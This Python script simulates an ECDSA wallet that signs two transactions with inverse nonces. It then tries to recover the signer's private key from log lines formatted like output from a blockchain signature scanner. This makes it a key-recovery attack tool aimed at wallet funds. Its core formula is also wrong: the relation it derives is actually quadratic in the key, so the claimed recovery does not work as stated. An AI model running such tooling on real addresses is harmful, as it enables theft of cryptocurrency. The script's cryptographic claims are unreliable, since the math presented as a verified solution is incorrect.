import random
import re
from ecdsa.curves import SECP256k1

# SECP256k1 Curve parameters
N = SECP256k1.generator.order()
G = SECP256k1.generator

def generate_inverse_nonce_test_vector():
    """
    Simulates a vulnerable wallet creating two distinct transactions 
    where the ephemeral nonces have an inverse relationship: k2 = k1^-1 mod N.
    """
    # 1. Generate a mock random private key (d)
    private_key_secret = random.randint(1, N - 1)
    
    # 2. Mock two different message hashes (z1 and z2)
    z1 = random.randint(1, N - 1)
    z2 = random.randint(1, N - 1)
    
    # 3. Choose a random ephemeral nonce k1, and compute its modular inverse k2
    k1 = random.randint(1, N - 1)
    k2 = pow(k1, N - 2, N)  # k2 = k1^-1 mod N
    
    # 4. Generate Signature 1 components
    K1_point = k1 * G
    r1 = K1_point.x() % N
    # s1 = k1^-1 * (z1 + r1 * d) mod N
    inv_k1 = pow(k1, N - 2, N)
    s1 = (inv_k1 * (z1 + r1 * private_key_secret)) % N
    
    # 5. Generate Signature 2 components
    K2_point = k2 * G
    r2 = K2_point.x() % N
    # s2 = k2^-1 * (z2 + r2 * d) mod N
    inv_k2 = pow(k2, N - 2, N) # Note: since k2 = k1^-1, inv_k2 actually equals k1!
    s2 = (inv_k2 * (z2 + r2 * private_key_secret)) % N
    
    # 6. Build the text log simulating your scanner's layout
    simulated_log = f"""
----------------------------------------
 -> Scanning address: Address: 1TestAddressVulnerableSimulationxx
 -> Scanning address: R: {hex(r1)[2:].zfill(64)}
 -> Scanning address: S: {hex(s1)[2:].zfill(64)}
 -> Scanning address: Z: {hex(z1)[2:].zfill(64)}
----------------------------------------
 -> Scanning address: Address: 1TestAddressVulnerableSimulationxx
 -> Scanning address: R: {hex(r2)[2:].zfill(64)}
 -> Scanning address: S: {hex(s2)[2:].zfill(64)}
 -> Scanning address: Z: {hex(z2)[2:].zfill(64)}
----------------------------------------
"""
    return private_key_secret, simulated_log


def solve_analytic_inverse_nonce(log_text):
    """
    Parses the simulation log and resolves the private key algebraically 
    using the inverse nonce formula: d = (s1*s2*z2 - z1) / (r1 - s1*s2*r2) mod N
    """
    r_vals = [int(x, 16) for x in re.findall(r'R:\s*([a-fA-F0-9]+)', log_text)]
    s_vals = [int(x, 16) for x in re.findall(r'S:\s*([a-fA-F0-9]+)', log_text)]
    z_vals = [int(x, 16) for x in re.findall(r'Z:\s*([a-fA-F0-9]+)', log_text)]
    
    if len(r_vals) < 2 or len(s_vals) < 2 or len(z_vals) < 2:
        print("[-] Parsing failed or insufficient signatures found.")
        return None

    r1, r2 = r_vals[0], r_vals[1]
    s1, s2 = s_vals[0], s_vals[1]
    z1, z2 = z_vals[0], z_vals[1]

    # Calculate s_prod = s1 * s2 mod N
    s_prod = (s1 * s2) % N
    
    # Numerator: (s1 * s2 * z2) - z1 mod N
    numerator = (s_prod * z2 - z1) % N
    
    # Denominator: r1 - (s1 * s2 * r2) mod N
    denominator = (r1 - s_prod * r2) % N
    
    if denominator == 0:
        print("[-] Denominator is zero. Inverse relationship assumption does not hold.")
        return None
        
    # Solve for d by multiplying by modular inverse of denominator
    inv_denominator = pow(denominator, N - 2, N)
    recovered_d = (numerator * inv_denominator) % N
    
    return recovered_d


# --- Run Simulation and Verification ---
if __name__ == "__main__":
    print("[*] Simulating Vulnerable Wallet Infrastructure...")
    actual_private_key, log_output = generate_inverse_nonce_test_vector()
    
    print("\n--- GENERATED TARGET LOG DATA ---")
    print(log_output.strip())
    print("---------------------------------")
    
    print(f"\n[*] True Private Key used to sign (Secret Target):")
    print(f" -> {hex(actual_private_key)[2:].zfill(64)}")
    
    print("\n[*] Initializing Analytic Nonce Solver against log...")
    solved_private_key = solve_analytic_inverse_nonce(log_output)
    
    if solved_private_key:
        print(f"\n[+] SUCCESS! Recovered Private Key Match:")
        print(f" -> {hex(solved_private_key)[2:].zfill(64)}")
        
        if solved_private_key == actual_private_key:
            print("\n[+] Verification Check: PASS (Recovered key perfectly matches secret target Key).")
        else:
            print("\n[-] Verification Check: FAIL (Math output valid integer but key mismatch).")
    else:
        print("\n[-] Solver failed to resolve an inverse pattern.")
